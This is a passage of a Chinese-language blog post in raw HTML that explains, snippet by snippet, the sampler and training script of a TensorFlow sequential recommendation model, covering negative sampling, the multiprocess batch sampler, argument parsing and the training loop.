<span class=\"keyword\">return</span> t</span><br></pre></td></tr></table></figure></p>\n<p><strong>作用</strong>：在区间 <code>[l, r)</code>  内随机生成一个不在集合 <code>s</code>  中的整数。</p>\n<ul>\n<li><code>np.random.randint(l, r)</code> ：生成区间 <code>[l, r)</code>  内的随机整数。</li>\n<li>如果生成的整数 <code>t</code>  在集合 <code>s</code>  中，则重新生成，直到 <code>t</code>  不在集合 <code>s</code>  中为止。</li>\n</ul>\n<h3 id=\"数据采样函数-sample_function\"><a class=\"anchor\" href=\"#数据采样函数-sample_function\">#</a> 数据采样函数  <code>sample_function</code></h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sample_function</span>(<span class=\"params\">user_train, usernum, itemnum, batch_size, maxlen, result_queue, SEED</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">sample</span>():</span><br><span class=\"line\">        user = np.random.randint(<span class=\"number\">1</span>, usernum + <span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"built_in\">len</span>(user_train[user]) &lt;= <span class=\"number\">1</span>: user = np.random.randint(<span class=\"number\">1</span>, usernum + <span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        seq = np.zeros([maxlen], dtype=np.int32)</span><br><span class=\"line\">        pos = np.zeros([maxlen], dtype=np.int32)</span><br><span class=\"line\">        neg = np.zeros([maxlen], dtype=np.int32)</span><br><span class=\"line\">        nxt = user_train[user][-<span class=\"number\">1</span>]</span><br><span class=\"line\">        idx = maxlen - <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        ts = <span class=\"built_in\">set</span>(user_train[user])</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">reversed</span>(user_train[user][:-<span class=\"number\">1</span>]):</span><br><span class=\"line\">            seq[idx] = i</span><br><span class=\"line\">            pos[idx] = nxt</span><br><span class=\"line\">            <span class=\"keyword\">if</span> nxt != <span class=\"number\">0</span>: neg[idx] = random_neq(<span class=\"number\">1</span>, itemnum + <span class=\"number\">1</span>, ts)</span><br><span class=\"line\">            nxt = i</span><br><span class=\"line\">            idx -= <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> idx == -<span class=\"number\">1</span>: <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> (user, seq, pos, neg)</span><br><span class=\"line\"></span><br><span class=\"line\">    np.random.seed(SEED)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        one_batch = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(batch_size):</span><br><span class=\"line\">            one_batch.append(sample())</span><br><span class=\"line\"></span><br><span class=\"line\">        result_queue.put(<span class=\"built_in\">zip</span>(*one_batch))</span><br></pre></td></tr></table></figure></p>\n<p><strong>作用</strong>：在多进程环境下进行数据采样，并将结果放入队列中。</p>\n<ul>\n<li><strong>内部函数  <code>sample</code> </strong>：\n<ul>\n<li>随机选择一个有交互记录的用户。</li>\n<li>初始化序列 <code>seq</code> 、正样本 <code>pos</code>  和负样本 <code>neg</code> 。</li>\n<li>从用户的交互记录中构建序列和正负样本。</li>\n<li>使用 <code>random_neq</code>  函数生成负样本。</li>\n<li>返回一个包含用户 ID、序列、正样本和负样本的元组。</li>\n</ul>\n</li>\n<li><strong> <code>np.random.seed(SEED)</code> </strong>：设置随机种子，以保证多进程中的随机性。</li>\n<li><strong>无限循环</strong>：不断生成批量数据。\n<ul>\n<li><strong> <code>one_batch.append(sample())</code> </strong>：生成一个批量数据，并添加到 <code>one_batch</code>  列表中。</li>\n<li><strong> <code>result_queue.put(zip(\\*one_batch))</code> </strong>：将批量数据打包并放入结果队列中。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"warpsampler-类\"><a class=\"anchor\" href=\"#warpsampler-类\">#</a>  <code>WarpSampler</code>  类</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">WarpSampler</span>(<span class=\"title class_ inherited__\">object</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, User, usernum, itemnum, batch_size=<span class=\"number\">64</span>, maxlen=<span class=\"number\">10</span>, n_workers=<span class=\"number\">1</span></span>):</span><br><span class=\"line\">        self.result_queue = Queue(maxsize=n_workers * <span class=\"number\">10</span>)</span><br><span class=\"line\">        self.processors = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n_workers):</span><br><span class=\"line\">            self.processors.append(</span><br><span class=\"line\">                Process(target=sample_function, args=(User,</span><br><span class=\"line\">                                                      usernum,</span><br><span class=\"line\">                                                      itemnum,</span><br><span class=\"line\">                                                      batch_size,</span><br><span class=\"line\">                                                      maxlen,</span><br><span class=\"line\">                                                      self.result_queue,</span><br><span class=\"line\">                                                      np.random.randint(<span class=\"number\">2e9</span>)</span><br><span class=\"line\">                                                      )))</span><br><span class=\"line\">            self.processors[-<span class=\"number\">1</span>].daemon = <span class=\"literal\">True</span></span><br><span class=\"line\">            self.processors[-<span class=\"number\">1</span>].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">next_batch</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.result_queue.get()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">close</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> self.processors:</span><br><span class=\"line\">            p.terminate()</span><br><span class=\"line\">            p.join()</span><br></pre></td></tr></table></figure></p>\n<p><strong>作用</strong>：管理多个数据采样进程，并提供获取批量数据的方法。</p>\n<ul>\n<li>\n<p><strong>初始化方法  <code>__init__</code> </strong>：</p>\n<ul>\n<li>\n<p><strong> <code>self.result_queue</code> </strong>：创建一个结果队列，用于存储采样结果。</p>\n</li>\n<li>\n<p><strong> <code>self.processors</code> </strong>：初始化一个空列表，用于存储采样进程。</p>\n</li>\n<li>\n<p>循环创建进程</p>\n<p>：</p>\n<ul>\n<li>创建 <code>Process</code>  对象，目标函数为 <code>sample_function</code> ，传入所需参数。</li>\n<li>将进程设为守护进程。</li>\n<li>启动进程并添加到 <code>self.processors</code>  列表中。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><strong> <code>next_batch</code>  方法</strong>：</p>\n<ul>\n<li><strong> <code>self.result_queue.get()</code> </strong>：从结果队列中获取一个批量数据。</li>\n</ul>\n</li>\n<li>\n<p><strong> <code>close</code>  方法</strong>：</p>\n<ul>\n<li>\n<p>循环终止进程</p>\n<p>：</p>\n<ul>\n<li><strong> <code>p.terminate()</code> </strong>：终止进程。</li>\n<li><strong> <code>p.join()</code> </strong>：等待进程终止。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"mainpy\"><a class=\"anchor\" href=\"#mainpy\">#</a> <span class=\"exturl\" data-url=\"aHR0cDovL21haW4ucHk=\">main.py</span></h2>\n<p>这个代码实现了一个基于 TensorFlow 的推荐系统的训练流程，具体解析如下：</p>\n<ol>\n<li><strong>导入模块</strong>：导入必要的库和模块。</li>\n<li><strong>参数解析</strong>：定义并解析命令行参数。</li>\n<li><strong>创建训练目录</strong>：检查并创建训练目录，保存解析的参数。</li>\n<li><strong>数据分割</strong>：调用数据分割函数获取训练集、验证集和测试集。</li>\n<li><strong>TensorFlow 会话配置</strong>：配置 TensorFlow 会话。</li>\n<li><strong>数据采样器和模型初始化</strong>：初始化数据采样器和模型，并初始化所有变量。</li>\n<li><strong>训练过程</strong>：训练模型并定期评估模型性能。</li>\n<li><strong>异常处理和资源清理</strong>：确保在异常发生或正常结束时关闭采样器和日志文件。</li>\n</ol>\n<p>这些步骤共同构成了一个完整的推荐系统训练流程。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"keyword\">import</span> tensorflow <span class=\"keyword\">as</span> tf</span><br><span class=\"line\"><span class=\"keyword\">from</span> sampler <span class=\"keyword\">import</span> WarpSampler</span><br><span class=\"line\"><span class=\"keyword\">from</span> model <span class=\"keyword\">import</span> Model</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm</span><br><span class=\"line\"><span class=\"keyword\">from</span> util <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">str2bool</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> s <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> &#123;<span class=\"string\">&#x27;False&#x27;</span>, <span class=\"string\">&#x27;True&#x27;</span>&#125;:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> ValueError(<span class=\"string\">&#x27;Not a valid boolean string&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s == <span class=\"string\">&#x27;True&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">parser = argparse.ArgumentParser()</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--dataset&#x27;</span>, required=<span class=\"literal\">True</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--train_dir&#x27;</span>, required=<span class=\"literal\">True</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--batch_size&#x27;</span>, default=<span class=\"number\">128</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">int</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--lr&#x27;</span>, default=<span class=\"number\">0.001</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">float</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--maxlen&#x27;</span>, default=<span class=\"number\">50</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">int</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--hidden_units&#x27;</span>, default=<span class=\"number\">50</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">int</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--num_blocks&#x27;</span>, default=<span class=\"number\">2</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">int</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--num_epochs&#x27;</span>, default=<span class=\"number\">201</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">int</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--num_heads&#x27;</span>, default=<span class=\"number\">1</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">int</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--dropout_rate&#x27;</span>, default=<span class=\"number\">0.5</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">float</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--l2_emb&#x27;</span>, default=<span class=\"number\">0.0</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">float</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">args = parser.parse_args()</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.isdir(args.dataset + <span class=\"string\">&#x27;_&#x27;</span> + args.train_dir):</span><br><span class=\"line\">    os.makedirs(args.dataset + <span class=\"string\">&#x27;_&#x27;</span> + args.train_dir)</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(os.path.join(args.dataset + <span class=\"string\">&#x27;_&#x27;</span> + args.train_dir, <span class=\"string\">&#x27;args.txt&#x27;</span>), <span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    f.write(<span class=\"string\">&#x27;\\n&#x27;</span>.join([<span class=\"built_in\">str</span>(k) + <span class=\"string\">&#x27;,&#x27;</span> + <span class=\"built_in\">str</span>(v) <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> <span class=\"built_in\">sorted</span>(<span class=\"built_in\">vars</span>(args).items(), key=<span class=\"keyword\">lambda</span> x: x[<span class=\"number\">0</span>])]))</span><br><span class=\"line\">f.close()</span><br><span class=\"line\"></span><br><span class=\"line\">dataset = data_partition(args.dataset)</span><br><span class=\"line\">[user_train, user_valid, user_test, usernum, itemnum] = dataset</span><br><span class=\"line\">num_batch = <span class=\"built_in\">len</span>(user_train) / args.batch_size</span><br><span class=\"line\">cc = <span class=\"number\">0.0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> u <span class=\"keyword\">in</span> user_train:</span><br><span class=\"line\">    cc += <span class=\"built_in\">len</span>(user_train[u])</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&#x27;average sequence length: %.2f&#x27;</span> % (cc / <span class=\"built_in\">len</span>(user_train))</span><br><span class=\"line\"></span><br><span class=\"line\">f = <span class=\"built_in\">open</span>(os.path.join(args.dataset + <span class=\"string\">&#x27;_&#x27;</span> + args.train_dir, <span class=\"string\">&#x27;log.txt&#x27;</span>), <span class=\"string\">&#x27;w&#x27;</span>)</span><br><span class=\"line\">config = tf.ConfigProto()</span><br><span class=\"line\">config.gpu_options.allow_growth = <span class=\"literal\">True</span></span><br><span class=\"line\">config.allow_soft_placement = <span class=\"literal\">True</span></span><br><span class=\"line\">sess = tf.Session(config=config)</span><br><span class=\"line\"></span><br><span class=\"line\">sampler = WarpSampler(user_train, usernum, itemnum, batch_size=args.batch_size, maxlen=args.maxlen, n_workers=<span class=\"number\">3</span>)</span><br><span class=\"line\">model = Model(usernum, itemnum, args)</span><br><span class=\"line\">sess.run(tf.initialize_all_variables())</span><br><span class=\"line\"></span><br><span class=\"line\">T = <span class=\"number\">0.0</span></span><br><span class=\"line\">t0 = time.time()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> epoch <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, args.num_epochs + <span class=\"number\">1</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> step <span class=\"keyword\">in</span> tqdm(<span class=\"built_in\">range</span>(num_batch), total=num_batch, ncols=<span class=\"number\">70</span>, leave=<span class=\"literal\">False</span>, unit=<span class=\"string\">&#x27;b&#x27;</span>):</span><br><span class=\"line\">            u, seq, pos, neg = sampler.next_batch()</span><br><span class=\"line\">            auc, loss, _ = sess.run([model.auc, model.loss, model.train_op],</span><br><span class=\"line\">                                    &#123;model.u: u, model.input_seq: seq, model.pos: pos, model.neg: neg,</span><br><span class=\"line\">                                     model.is_training: <span class=\"literal\">True</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> epoch % <span class=\"number\">20</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            t1 = time.time() - t0</span><br><span class=\"line\">            T += t1</span><br><span class=\"line\">            <span class=\"built_in\">print</span> <span class=\"string\">&#x27;Evaluating&#x27;</span>,</span><br><span class=\"line\">            t_test = evaluate(model, dataset, args, sess)</span><br><span class=\"line\">            t_valid = evaluate_valid(model, dataset, args, sess)</span><br><span class=\"line\">            <span class=\"built_in\">print</span> <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">            <span class=\"built_in\">print</span> <span class=\"string\">&#x27;epoch:%d, time: %f(s), valid (NDCG@10: %.4f, HR@10: %.4f), test (NDCG@10: %.4f, HR@10: %.4f)&#x27;</span> % (</span><br><span class=\"line\">            epoch, T, t_valid[<span class=\"number\">0</span>], t_valid[<span class=\"number\">1</span>], t_test[<span class=\"number\">0</span>], t_test[<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">            f.write(<span class=\"built_in\">str</span>(t_valid) + <span class=\"string\">&#x27; &#x27;</span> + <span class=\"built_in\">str</span>(t_test) + <span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">            f.flush()</span><br><span class=\"line\">            t0 = time.time()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    sampler.close()</span><br><span class=\"line\">    f.close()</span><br><span class=\"line\">    exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">f.close()</span><br><span class=\"line\">sampler.close()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Done&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"导入模块-3\"><a class=\"anchor\" href=\"#导入模块-3\">#</a> 导入模块</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"keyword\">import</span> tensorflow <span class=\"keyword\">as</span> tf</span><br><span class=\"line\"><span class=\"keyword\">from</span> sampler <span class=\"keyword\">import</span> WarpSampler</span><br><span class=\"line\"><span class=\"keyword\">from</span> model <span class=\"keyword\">import</span> Model</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> tqdm</span><br><span class=\"line\"><span class=\"keyword\">from</span> util <span class=\"keyword\">import</span> *</span><br></pre></td></tr></table></figure></p>\n<p><strong>作用</strong>：导入所需的模块，包括系统模块、时间模块、参数解析模块、TensorFlow、数据采样器、模型、进度条显示模块和一些实用函数。</p>\n<h3 id=\"定义布尔类型的字符串转换函数-str2bool\"><a class=\"anchor\" href=\"#定义布尔类型的字符串转换函数-str2bool\">#</a> 定义布尔类型的字符串转换函数  <code>str2bool</code></h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">str2bool</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> s <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> &#123;<span class=\"string\">&#x27;False&#x27;</span>, <span class=\"string\">&#x27;True&#x27;</span>&#125;:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> ValueError(<span class=\"string\">&#x27;Not a valid boolean string&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s == <span class=\"string\">&#x27;True&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>作用</strong>：将字符串转换为布尔值，如果字符串不是 'False' 或 'True'，则抛出异常。</p>\n<h3 id=\"参数解析器-argparse\"><a class=\"anchor\" href=\"#参数解析器-argparse\">#</a> 参数解析器  <code>argparse</code></h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">parser = argparse.ArgumentParser()</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--dataset&#x27;</span>, required=<span class=\"literal\">True</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--train_dir&#x27;</span>, required=<span class=\"literal\">True</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--batch_size&#x27;</span>, default=<span class=\"number\">128</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">int</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--lr&#x27;</span>, default=<span class=\"number\">0.001</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">float</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--maxlen&#x27;</span>, default=<span class=\"number\">50</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">int</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--hidden_units&#x27;</span>, default=<span class=\"number\">50</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">int</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--num_blocks&#x27;</span>, default=<span class=\"number\">2</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">int</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--num_epochs&#x27;</span>, default=<span class=\"number\">201</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">int</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--num_heads&#x27;</span>, default=<span class=\"number\">1</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">int</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--dropout_rate&#x27;</span>, default=<span class=\"number\">0.5</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">float</span>)</span><br><span class=\"line\">parser.add_argument(<span class=\"string\">&#x27;--l2_emb&#x27;</span>, default=<span class=\"number\">0.0</span>, <span class=\"built_in\">type</span>=<span class=\"built_in\">float</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">args = parser.parse_args()</span><br></pre></td></tr></table></figure></p>\n<p><strong>作用</strong>：定义并解析命令行参数。</p>\n<ul>\n<li><code>--dataset</code> ：数据集名称，必选。</li>\n<li><code>--train_dir</code> ：训练目录，必选。</li>\n<li>其他参数有默认值，包括批量大小、学习率、最大序列长度、隐藏单元数、块数量、训练轮数、注意力头数量、dropout 率和 L2 正则化参数。</li>\n</ul>\n<h3 id=\"创建训练目录并保存参数\"><a class=\"anchor\" href=\"#创建训练目录并保存参数\">#</a> 创建训练目录并保存参数</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.isdir(args.dataset + <span class=\"string\">&#x27;_&#x27;</span> + args.train_dir):</span><br><span class=\"line\">    os.makedirs(args.dataset + <span class=\"string\">&#x27;_&#x27;</span> + args.train_dir)</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(os.path.join(args.dataset + <span class=\"string\">&#x27;_&#x27;</span> + args.train_dir, <span class=\"string\">&#x27;args.txt&#x27;</span>), <span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    f.write(<span class=\"string\">&#x27;\\n&#x27;</span>.join([<span class=\"built_in\">str</span>(k) + <span class=\"string\">&#x27;,&#x27;</span> + <span class=\"built_in\">str</span>(v) <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> <span class=\"built_in\">sorted</span>(<span class=\"built_in\">vars</span>(args).items(), key=<span class=\"keyword\">lambda</span> x: x[<span class=\"number\">0</span>])]))</span><br><span class=\"line\">f.close()</span><br></pre></td></tr></table></figure></p>\n<p><strong>作用</strong>：检查并创建训练目录，将解析的参数保存到 <code>args.txt</code>  文件中。</p>\n<h3 id=\"数据分割\"><a class=\"anchor\" href=\"#数据分割\">#</a> 数据分割</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dataset = data_partition(args.dataset)</span><br><span class=\"line\">[user_train, user_valid, user_test, usernum, itemnum] = dataset</span><br><span class=\"line\">num_batch = <span class=\"built_in\">len</span>(user_train) / args.batch_size</span><br><span class=\"line\">cc = <span class=\"number\">0.0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> u <span class=\"keyword\">in</span> user_train:</span><br><span class=\"line\">    cc += <span class=\"built_in\">len</span>(user_train[u])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;average sequence length: %.2f&#x27;</span> % (cc / <span class=\"built_in\">len</span>(user_train)))</span><br></pre></td></tr></table></figure></p>\n<p><strong>作用</strong>：调用数据分割函数 <code>data_partition</code> ，获取训练集、验证集、测试集、用户数量和物品数量。计算并打印平均序列长度。</p>\n<h3 id=\"tensorflow-会话配置\"><a class=\"anchor\" href=\"#tensorflow-会话配置\">#</a> TensorFlow 会话配置</h3>\n<p><figure 